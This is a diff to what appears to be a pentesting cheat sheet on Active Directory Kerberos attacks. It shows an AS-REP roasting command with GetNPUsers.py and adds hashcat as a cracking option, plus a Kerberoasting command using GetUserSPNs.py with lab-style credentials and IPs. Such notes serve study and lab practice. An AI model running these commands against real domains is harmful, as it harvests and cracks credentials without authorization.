@@ -19,4 +19,11 @@ python3 GetNPUsers.py -dc-ip 192.168.1.105 DOMAIN.local/  -usersfile users.txt
 
 It will spit out TGT (ticket granting ticket) for that user if vulnerable. 
 
-The TGT can actually be cracked for a password using john
+The TGT can actually be cracked for a password using john or hashcat
+
+---
+
+### find kerberoastable accounts
+```
+sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.248.15 -request
+```
